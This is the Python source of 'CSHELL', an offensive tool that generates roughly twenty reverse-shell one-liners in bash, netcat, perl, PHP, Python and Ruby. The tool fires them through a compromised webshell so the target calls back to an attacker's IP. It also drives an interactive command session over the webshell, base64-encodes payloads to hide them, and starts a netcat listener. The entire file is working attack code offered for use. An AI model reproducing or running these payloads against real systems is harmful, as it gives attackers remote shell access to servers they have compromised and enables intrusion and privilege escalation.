#!/usr/bin/python3
import requests
import urllib.parse
import argparse
import os
import sys
import json
from datetime import datetime
import random
import time
import socket
import fcntl
import struct
import pyperclip as pc
import base64
from IPy import IP
import textwrap




blue = "\033[34m"                                                                                                                                                                          
bold = "\033[1m"                                                                                                                                                                              
green = "\033[32m"                                                                                                                                                                            
purple = "\033[95m"                            
red = "\033[91m"                               
end = "\033[0m"                               


#=================================================================================================================================================	
#This contains all the payload for displaying the payload on the info area
#=================================================================================================================================================	
payloads_dict = { 
		"bash-196":"\t\t\t0<&196;exec 196<>/dev/tcp/127.0.0.1/1337; bash <&196 >&196 2>&196",
		"bash":"\t\t\t\tbash -i >& /dev/tcp/127.0.0.1/1337 0>&1",
		"bash-read-line":"\t\t\texec 5<>/dev/tcp/127.0.0.1/1337;cat <&5 | while read line; do $line 2>&5 >&5; done",
		"bash-5":"\t\t\t\tbash -i 5<> /dev/tcp/127.0.0.1/1337 0<&5 1>&5 2>&5",
		"bash-udp":"\t\t\tbash -i >& /dev/udp/127.0.0.1/1337 0>&1",
		"nc-mkfifo":"\t\t\trm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 127.0.0.1 1337 >/tmp/f",
		"nc":"\t\t\t\tnc -e /bin/bash 127.0.0.1 1337",
		"nc-c":"\t\t\t\tnc -c /bin/bash 127.0.0.1 1337",
		"ncat-e":"\t\t\t\tncat 127.0.0.1 1337 -e /bin/bash",
		"perl":"\t\t\t\tperl -e 'use Socket;$i=\"127.0.0.1\";$p=1337;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"bash -i\");};'",
		"php-exec":"\t\t\tphp -r '$sock=fsockopen(\"127.0.0.1\",1337);exec(\"bash <&3 >&3 2>&3\");'",
		"php-shell-exec":"\t\t\tphp -r '$sock=fsockopen(\"127.0.0.1\",1337);shell_exec(\"bash <&3 >&3 2>&3\");'",
		"php-system":"\t\t\tphp -r '$sock=fsockopen(\"127.0.0.1\",1337);system(\"bash <&3 >&3 2>&3\");'",
		"php-passthru":"\t\t\tphp -r '$sock=fsockopen(\"127.0.0.1\",1337);passthru(\"bash <&3 >&3 2>&3\");'",
		"php-popen":"\t\t\tphp -r '$sock=fsockopen(\"127.0.0.1\",1337);popen(\"bash <&3 >&3 2>&3\", \"r\");'",
		"python":"\t\t\t\tpython -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"127.0.0.1\",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"bash\")'",
		"python-export":"\t\t\texport RHOST=\"127.0.0.1\";export RPORT=1337;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"bash\")'",
		"python3":"\t\t\t\tpython3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"127.0.0.1\",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"bash\")'",
		"python3-export":"\t\t\texport RHOST=\"127.0.0.1\";export RPORT=1337;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"bash\")",
		"ruby":"\t\t\t\texport RHOST=127.0.0.1;export RPORT=1337;ruby -rsocket -e 'exit if fork;c=TCPSocket.new(ENV[\"RHOST\"],ENV[\"RPORT\"]);while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
	}
#=================================================================================================================================================	
  # [+] Green positive message   
#=================================================================================================================================================	       
def ap(text) :                  
    print(f"{bold}{green}[+] {end}{text}")

#=================================================================================================================================================	
 # [*] Purple info message  
#=================================================================================================================================================	                
def ainfo(text) :     
    print(f"{bold}{purple}[*] {end}{text}")

#=================================================================================================================================================	
# [-] Red negetive message 
#=================================================================================================================================================	
def aerr(text) :                              
    print(f"{bold}{red}[-] {end}{text}")

#=================================================================================================================================================	
# stating banner 
#=================================================================================================================================================	
def banner(): 
	colors = ["\033[31" , "\033[32" , "\033[33" , "\033[34" , "\033[35" , "\033[36" ,"\033[91" , "\033[92" , "\033[93" , "\033[94" , "\033[94" ,"\033[96"] #contains some color code
	print(f"""{random.choice(colors)}m
 ▄████▄    ██████  ██░ ██ ▓█████  ██▓     ██▓    
▒██▀ ▀█  ▒██    ▒ ▓██░ ██▒▓█   ▀ ▓██▒    ▓██▒    
▒▓█    ▄ ░ ▓██▄   ▒██▀▀██░▒███   ▒██░    ▒██░    
▒▓▓▄ ▄██▒  ▒   ██▒░▓█ ░██ ▒▓█  ▄ ▒██░    ▒██░    
▒ ▓███▀ ░▒██████▒▒░▓█▒░██▓░▒████▒░██████▒░██████▒
░ ░▒ ▒  ░▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒░░ ▒░ ░░ ▒░▓  ░░ ▒░▓  ░
  ░  ▒   ░ ░▒  ░ ░ ▒ ░▒░ ░ ░ ░  ░░ ░ ▒  ░░ ░ ▒  ░
░        ░  ░  ░   ░  ░░ ░   ░     ░ ░     ░ ░   
░ ░            ░   ░  ░  ░   ░  ░    ░  ░    ░  ░
░                                                
\033[0m""") # picks random colors from colors array and display the banner with that color and reset the collor using \033[0m


#=================================================================================================================================================	
# This function checks the avalibility of the target, if the target is reachable or not. and it also checks if the .php file is there or not
#=================================================================================================================================================	
def avalability_check(target , type): 
	ainfo("Checking avalability of the Address")
	splitted_target = list(map(str , target.split('/'))) # Splitts the .php file from the url example. 'cmd.php' from http://127.0.0.1/cmd.php
	splitted_php_param = list(map(str, splitted_target[-1].split("?")))
	try:
		r = requests.get(target.replace(type , 'id')) # Checks the availibility of the target by sending a get request
		ap("Address is alive")
		if r.status_code == 200: # Compares the status code to check the availability of the .php file
			ap(f"Found : {splitted_php_param[0]}")
			if 'uid' in r.text and 'gid' in r.text and 'groups' in r.text: #checks if uid, gid and groups are available on the response
				ap("Command executed successfully") 
				return True
			else:
				aerr("Command exection failed.")
				ainfo(f"Check : {splitted_php_param[0]}")
				aerr("Exitting...")
				return False
				 # If target address and .php file is available it returns True
		elif r.status_code == 404:
			aerr(f"Not found : {splitted_target[-1]} ")
			return False
	except:
		aerr("Address isn't alive")
		aerr("Exitting...")
		return False


#=================================================================================================================================================	
# This function checks for the base of the payload example. 'bash' in bash -i /dev/tc..
#=================================================================================================================================================	
def payload_base_test(target , payloadtype):
	payloadtype = list(map(str , payloadtype.split("-")))[0] #splits the payload base from the payloadtype as bash-196 which wlso uses bash, so we have to split bash-196 using '-' inorder to get the base
	ainfo(f"Testing the avalability of {payloadtype} on the target")
	r = requests.get(f"{target.replace('REV' ,f'which+{payloadtype}' )}") #sends a command 'which <payload base>', if the base is available on the host this returns the path of that host else if returns blank
	if r.text != "": # This line checks if the response is not blank, if it blanks that means base isn't available
		ap(f"{payloadtype} is available")
		return True
	else:
		aerr(f"{payloadtype} isn't available on the target.Try another one")
		aerr("Exitting...")
		return False
		quit()
#=================================================================================================================================================	
# This function sends the payload 
#=================================================================================================================================================	
def send_payload(target , payload ):
	ainfo("Sending payload")
	try:
		requests.get(target.replace("REV" , payload) , timeout=2) #here timeout is given as after sending the reverse shell the page stops responding. so this timeout will wait for the given time and exit after that time, here we added try execpt beacause this returns a error 'requests.exceptions.ReadTimeout' after exitting on timeout
	except requests.exceptions.ReadTimeout: #if error is requests.exceptions.ReadTimeout, this will do nothing.
		pass
	ap("Payload sent successfully")
	ainfo("Check Your listener")
	ap("Good luck on Privilege Escalation :)")

#=================================================================================================================================================	
# this functiion generates the payload
#=================================================================================================================================================	
def payloads(fmt , ip , port):
	port = str(port)
	ainfo("Generating Payload")
	#all payloads are url encoded as webshell sometimes doesn't work without encoding
	ploads = {
		"bash-196":"bash -c \"0<%26196%3bexec+196<>/dev/tcp/" + ip + "/" + port + "%3b+bash+<%26196+>%26196+2>%26196\"",
		"bash":"bash -c \"bash+-i+>%26+/dev/tcp/" + ip + "/" + port + "+0>%261\"",
		"bash-read-line":"bash -c \"exec+5<>/dev/tcp/" + ip + "/" + port + "%3bcat+<%265+|+while+read+line%3b+do+$line+2>%265+>%265%3b+done\"",
		"bash-5":"bash -c \"bash+-i+5<>+/dev/tcp/" + ip + "/" + port + "+0<%265+1>%265+2>%265\"",
		"bash-udp":"bash -c \"bash+-i+>%26+/dev/udp/" + ip + "/" + port + "+0>%261\"",
		"nc-mkfifo":"rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|bash+-i+2>%261|nc+" + ip + "+" + port + "+>/tmp/f",
		"nc":"nc+-e+/bin/bash+" + ip + "+" + port + "",
		"nc-c":"nc+-c+/bin/bash+" + ip + "+" + port + "",
		"ncat-e":"ncat+" + ip + "+" + port + "+-e+/bin/bash",
                "perl":"perl+-e+\'use+Socket%3b$i%3d\"" + ip + "\"%3b$p%3d" + port + "%3bsocket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"))%3bif(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">%26S\")%3bopen(STDOUT,\">%26S\")%3bopen(STDERR,\">%26S\")%3bexec(\"bash+-i\")%3b}%3b\'",
		"php-exec":"php+-r+\'$sock%3dfsockopen(\"" + ip + "\"," + port + ")%3bexec(\"bash+<%263+>%263+2>%263\")%3b\'",
		"php-shell-exec":"php+-r+\'$sock%3dfsockopen(\"" + ip + "\"," + port + ")%3bshell_exec(\"bash+<%263+>%263+2>%263\")%3b\'",
		"php-system":"php+-r+\'$sock%3dfsockopen(\"" + ip + "\"," + port + ")%3bsystem(\"bash+<%263+>%263+2>%263\")%3b\'",
		"php-passthru":"php+-r+\'$sock%3dfsockopen(\"" + ip + "\"," + port + ")%3bpassthru(\"bash+<%263+>%263+2>%263\")%3b\'",
		"php-popen":"php+-r+\'$sock%3dfsockopen(\"" + ip + "\"," + port + ")%3bpopen(\"bash+<%263+>%263+2>%263\",+\"r\")%3b\'",
		"python":"python+-c+\'import+socket,subprocess,os%3bs%3dsocket.socket(socket.AF_INET,socket.SOCK_STREAM)%3bs.connect((\"" + ip + "\"," + port + "))%3bos.dup2(s.fileno(),0)%3b+os.dup2(s.fileno(),1)%3bos.dup2(s.fileno(),2)%3bimport+pty%3b+pty.spawn(\"bash\")\'",
		"python-export":"export+RHOST%3d\"" + ip + "\"%3bexport+RPORT%3d" + port + "%3bpython+-c+\'import+sys,socket,os,pty%3bs%3dsocket.socket()%3bs.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))))%3b[os.dup2(s.fileno(),fd)+for+fd+in+(0,1,2)]%3bpty.spawn(\"bash\")\'",
		"python3":"python3+-c+\'import+socket,subprocess,os%3bs%3dsocket.socket(socket.AF_INET,socket.SOCK_STREAM)%3bs.connect((\"" + ip + "\"," + port + "))%3bos.dup2(s.fileno(),0)%3b+os.dup2(s.fileno(),1)%3bos.dup2(s.fileno(),2)%3bimport+pty%3b+pty.spawn(\"bash\")\'",
		"python3-export":"export+RHOST%3d\"" + ip + "\"%3bexport+RPORT%3d" + port + "%3bpython3+-c+\'import+sys,socket,os,pty%3bs%3dsocket.socket()%3bs.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))))%3b[os.dup2(s.fileno(),fd)+for+fd+in+(0,1,2)]%3bpty.spawn(\"bash\")\'",
		"ruby":"export+RHOST%3d" + ip + "%3bexport+RPORT%3d" + port + "%3bruby+-rsocket+-e+'exit+if+fork%3bc%3dTCPSocket.new(ENV[\"RHOST\"],ENV[\"RPORT\"])%3bwhile(cmd%3dc.gets)%3bIO.popen(cmd,\"r\"){|io|c.print+io.read}end'"
	}
	if fmt in list(ploads.keys()): # This checks if the given format is available on the payload or not 
		payload = (ploads.get(fmt))
		ap("Payload generated successfully")
		return payload
	else:
		aerr("Payload format not found")
		aerr("Exitting..")
		exit()

#=================================================================================================================================================	
# This function prints out the payload if --list_formats flags is set 
#=================================================================================================================================================	
def payload_list():
	print("========================================================================================================")
	print("Format-Name\t\t\tPayload")
	print("========================================================================================================")
	for key,value in payloads_dict.items(): #This prints all payloads
		print(key + value)

#=================================================================================================================================================	
#this function prints the info page which contains ip, port, target, payload, and payload-type
#=================================================================================================================================================	
def info(type, target , ip="0.0.0.0", port="1337" , payloadtype="bash" , base64encode=False , startlistener=True ): 
	now = datetime.now()
	dttime = now.strftime("%d-%m-%Y %H:%M:%S") # takes the time 
	print("========================================================================================================")
	print("By 0z09e  | Twitter => https://twiter.com/0z09e")
	print("========================================================================================================")
	if type == 'rev':
		ainfo(f"Target\t\t{target}")
		ainfo(f"Listening IP\t{ip}")
		ainfo(f"Listening Port\t{str(port)}")
		ainfo(f"Payload format\t{payloadtype}")
		ainfo("Payload\t\t" + payloads_dict.get(payloadtype).replace('\t' , '').replace("127.0.0.1" , ip).replace("1337" , str(port))) # This replace the target ip and port with the actual Attacker ip and port
		ainfo(f"Listener command\tsudo nc -lvnp {port}")
	elif type == 'lstnr':
		ainfo(f"Listening IP\t{ip}")
		ainfo(f"Listening Port\t{str(port)}")
		ainfo(f"Payload format\t{payloadtype}")
		ainfo(f"Base64 Encoding\t{str(base64encode)}")
		ainfo(f"Start Listener\t{str(startlistener)}")
	elif type == "web":
		ainfo(f"Target\t\t{target}")	
	print("========================================================================================================")
	ap(f"{dttime} Starting CSHELL")
	print("========================================================================================================")


#=================================================================================================================================================	
#This function creates a prompt for the cmd input
#=================================================================================================================================================	
def prompt(pwd , hostname , whoami):
    if whoami != 'root':
        prompt = f"{bold}{green}{whoami}{end}@{bold}{blue}{hostname}{end}:{pwd}$ "
        return prompt

    else:
        prompt = f"{bold}{red}{whoami}{end}{bold}@{bold}{blue}{hostname}{end}:{pwd}# "
        return prompt

    
#=================================================================================================================================================	
# This function filters the pwd and send it in correct form
#=================================================================================================================================================	

def pwd_filter(pwd):
    if ' ' in pwd: # it checks for spaces in pwd, if it is present then it encloses the pwd with quotes
        return f"\'{pwd}\'"
    else:
        return pwd

#=================================================================================================================================================
#	This function sends every command to the webshell
#=================================================================================================================================================	

def webshell(target):
	try:
		ap("Spawning prompt..")
		time.sleep(1)
		pwd = pwd_filter(requests.get(f"{target.replace('WEB' , 'pwd')}").text.rstrip())
		whoami = requests.get(f"{target.replace('WEB' , 'whoami')}").text.rstrip()		# |Getting necessary info for the 1st time prompt
		hostname = requests.get(f"{target.replace('WEB' , 'hostname')}").text.rstrip()
		
		print("\x1b[2J\x1b[H",end="") #This clears the screen
		while 1:
			inpt = input(prompt(pwd , hostname , whoami))
			cmd = requests.utils.quote(f"echo -n [OUTPUT_START] && cd {pwd}&&{inpt} 2>&1 &&echo [PROMPT_START]$(pwd)[+]$(hostname)[+]$(whoami)[PROMPT_END][OUTPUT_END]") # sending 2>&1 with the prompt in order to get the error message 
			res = requests.get(f"{target.replace('WEB' , cmd)}") # Replacing the web parameter with the cmd
			# Filtering the response and sorting necessary responses
			if "[OUTPUT_START]" in res.text and '[OUTPUT_END]' in res.text:
				response = res.text.split("[OUTPUT_START]")[1].split('[OUTPUT_END]')[0].split("[PROMPT_START]")
				output = str("".join(response[:1])).rstrip()
				print ((output))
				prompt_arr = list(map(str , response[1].split("[+]")))
				pwd = pwd_filter(prompt_arr[0].rstrip())
				hostname = prompt_arr[-2].rstrip()
				whoami = prompt_arr[-1].rstrip().replace("[PROMPT_END]" , "")
				
			# incase of error this prints out
			else:
				print(f"{red}{res.text.rstrip().replace('[OUTPUT_START]' , '')}")
	except:
		print()
		aerr("Exitting..")
#=================================================================================================================================================
#	This function extracts ip address from the interface names
#=================================================================================================================================================
def get_ip_address(ifname):
	if ifname in os.listdir('/sys/class/net/'): #checks the given interface in the host
		ifname = ifname.encode()
		s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		return socket.inet_ntoa(fcntl.ioctl(s.fileno(),0x8915,struct.pack('256s', ifname[:15]))[20:24]) #returns the extracted ip from the interface name
	else:
		aerr("Interface name not found")
		ap(f"Available Inferfaces [{', '.join(os.listdir('/sys/class/net/'))}]")
		sys.exit()
#=================================================================================================================================================
#	This function generate anc copies the payload to the clipboard and starts listener 
# ======================================================================================
def listener(ifname , port , payload_type='bash' , startlistener=False , base64encode=False):
    try: #checks if -i parameter is interface name or IP
        if IP(ifname):
            ip = ifname
    except ValueError:
        ip = get_ip_address(ifname)
    if payload_type in list(payloads_dict.keys()):
        ainfo("Generating payload")
        payload = payloads_dict.get(payload_type).replace("\t" , "").replace("127.0.0.1" , ip).replace("1337" , str(port)) #generates the payload
    else:
        aerr("Payload format not found")
        sys.exit()
	# Encodes the payload in base64 format
    if base64encode:
        ainfo("Encoding the payload into base64 format")
        payload_enc = payload.encode('ascii')
        b64_enc =base64.b64encode(payload_enc)
        b64_encoded_payload = b64_enc.decode('ascii')
        payload = f"echo {b64_encoded_payload}|base64 -d|bash"
    pc.copy(payload) #copy the payload into the clipboard
    ap("Payload has been copied to your clipboard")
    if startlistener: #starts the listener
        ainfo("Starting netcat listener")
        os.system(f"nc -lvnp {port}")

#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

def main():
	# This are for the Arguments
	myparser = argparse.ArgumentParser(formatter_class=argparse.RawDescriptionHelpFormatter ,  epilog=textwrap.dedent('''\
		web\tDirect command execution on the webshell with error message
		rev\tReverse shell from a working webshell
		lstnr\tGenerate payload, copy it to your clipboard and start a listener[Optional]\n

	'''))
	myparser.add_argument('--payloads' , action='store_true' , help='List all payload formats for rev' )
	subparsers = myparser.add_subparsers(dest='command')

#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
	# reverse shell arguments
	rev = subparsers.add_parser("rev" ,formatter_class=argparse.RawDescriptionHelpFormatter , description='''Description : It takes a working a webshell as an argument, executes the payload and returns a reverse shell on the listener.
		''' , epilog='[N.B - This doesn\'t comes with a builtin listener as it\'s impossible to trigger the payload and start a listener at the same time.\n You have to start a listener before executing this program]')
	rev.add_argument('-f', metavar='Format', type=str, required=False , default='bash' ,help='Reverse shell payload format. default : bash')
	rev_required = rev.add_argument_group('required arguments')
	rev_required.add_argument('-u', metavar='Target URL', required=True , default="test", help='Full URL of the target, Add \'REV\' as a command on the parametr. Example: http://127.0.0.1/webshell.php?cmd=REV')
	rev_required.add_argument('-i', metavar='Listening-IP' , required=True , help='Attacker\'s IP address for reciving reverse shell')
	rev_required.add_argument('-p', metavar='Listening-Port' , required=True , type=int, help='Attacker\'s Port In which the reverse shell will be recived. Note : Port must be in-between 1 to 65535')

#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
	# web shell arguments
	web = subparsers.add_parser("web" , formatter_class=argparse.RawDescriptionHelpFormatter , description='Description : It takes a working reverse shell as an argument and executes command on that reverse shell in real time,\n\t      This also shows error message and persists the working directory')
	web_required = web.add_argument_group('required arguments')
	web_required.add_argument('-u',  metavar="Target url" , required=True , help="Target URL with 'WEB' as a command. Example : http://127.0.0.1/webshell.php?cmd=WEB")


#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
	# listener Argument
	lstn = subparsers.add_parser("lstnr" , formatter_class=argparse.RawDescriptionHelpFormatter , description='Description : It generates and copies whatever payload from the payload list [You can list all the payloads using \'--payloads\']. it also starts a listener [Optional].')
	lstn.add_argument("-p" , metavar="Port" , required=False , default=9001 , help="Reverse shell's port. Default : 9001")
	lstn.add_argument("-f" , metavar="Format" , required=False , default="bash" , help="Reverse shell's format. Default : bash")
	lstn.add_argument("--lstn" , action='store_true' , required=False , help="Start the listener")
	lstn.add_argument("--b64" , action='store_true' , required=False , help="Encode the payload in base64 format. Example payload : echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvOTAwMSAwPiYxCg== | base64 -d | bash")
	lstn_required = lstn.add_argument_group("required arguments")
	lstn_required.add_argument("-i" , metavar="IP" , required=True , help="IP in which you want to send the reverse shell or you can specify the network interface. Example : -i 10.10.10.10 OR -i tun0")
#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

	
	args = myparser.parse_args()

	if args.command == "rev":
			banner()
			url = args.u
			ip = args.i
			port = args.p
			fmt = args.f
			if fmt not in list(payloads_dict.keys()):
				aerr("Format not found")
				ainfo("Shifting to defaut format : bash")
				fmt = "bash"
			if port not in range(1 , 65536):
				aerr("Port is out of range, expected between 1-65535")
				aerr("Exitting...")
				sys.exit()
			info( "rev" , url , ip , port , fmt , 'rev')
			if avalability_check(url , "REV") and payload_base_test(url , fmt):
				send_payload(url , payloads(fmt , ip , port))

	elif args.command == "web":
		banner()
		url = args.u
		info("web" , url)
		if avalability_check(url , "WEB"):
			webshell(url)
	elif args.command == "lstnr":
		banner()
		ip = args.i
		port = args.p
		fmt = args.f
		lstn = args.lstn
		b64 = args.b64
		info("lstnr" , None , ip , port=port, base64encode=b64 , startlistener=lstn , payloadtype=fmt)
		listener(ip , port , payload_type=fmt , startlistener=lstn , base64encode=b64)
	elif args.payloads:
		payload_list()
	else:
		banner()
		myparser.print_help()

